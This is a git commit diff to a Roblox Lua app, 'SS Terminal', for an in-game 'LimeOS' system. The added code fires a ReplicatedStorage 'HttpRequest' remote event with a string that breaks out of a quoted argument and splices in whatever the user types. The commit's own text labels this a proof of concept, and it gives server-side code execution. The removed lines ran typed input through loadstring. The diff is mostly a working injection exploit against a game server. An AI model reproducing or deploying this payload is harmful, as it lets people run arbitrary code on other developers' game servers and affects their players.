69128298285518ad4dce345cf5903d16f42049fe
XG213 <101302347+XG213@users.noreply.github.com>
2022-06-29 20:41:02 +1200

    Update SS_Terminal.lua

--- apps/SS_Terminal.lua
+++ apps/SS_Terminal.lua
@@ -1,22 +1,10 @@
---startmenu = true
-local apps_folder = game.Players:FindFirstChildWhichIsA("Player").PlayerGui.LimeOS.UIs.Apps
+-- startmenu = true
+local apps_folder = game.Players:FindFirstChildWhichIsA("Player").PlayerGui
+                        .LimeOS.UIs.Apps
 local app = apps_folder.Template.Template:Clone()
-app.AppCode:Destroy()
+app.AppCode.Value = [[local app = createapp("SS Terminal"); local frame = new("Frame", app); local input = new("TextBox", app); input.Size = UDim2.fromScale(1,0.5); input.Position = UDim2.fromScale(0,0); input.ClearTextOnFocus = false; input.Text = ""; local execute = new("TextButton", app); execute.Size = UDim2.fromScale(1,0.5); execute.Position = UDim2.fromScale(0,0.5); execute.Text = "Execute!"; local remote_event = uisfolder().Parent.Parent.Parent.Parent.Parent.ReplicatedStorage.HttpRequest; remote_event:FireServer(true, '");warn("Hello from the <insert name here> PoC","', false); execute.MouseButton1Click:Connect(function() remote_event:FireServer(true, '"); ' .. input.Text .. '; print("', false); end)]]
 app.Parent = apps_folder
 app.Name = "com.XG009.SS_Terminal"
 app.TextLabel.Text = "SS Terminal"
 app.TextLabel.ZIndex = 2
 app.SysAppName.Value = "SS Terminal"
-local input = Instance.new("TextBox", app.MainFrame)
-input.Size = UDim2.fromScale(1,0.5)
-input.Position = UDim2.fromScale(0,0)
-input.ClearTextOnFocus = false
-input.Text = "Hm"
-local execute = Instance.new("TextButton", app.MainFrame)
-execute.Size = UDim2.fromScale(1,0.5)
-execute.Position = UDim2.fromScale(0,0.5)
-execute.Text = "Execute!"
-
-execute.MouseButton1Click:Connect(function()
-    loadstring(input.Text)()
-end)
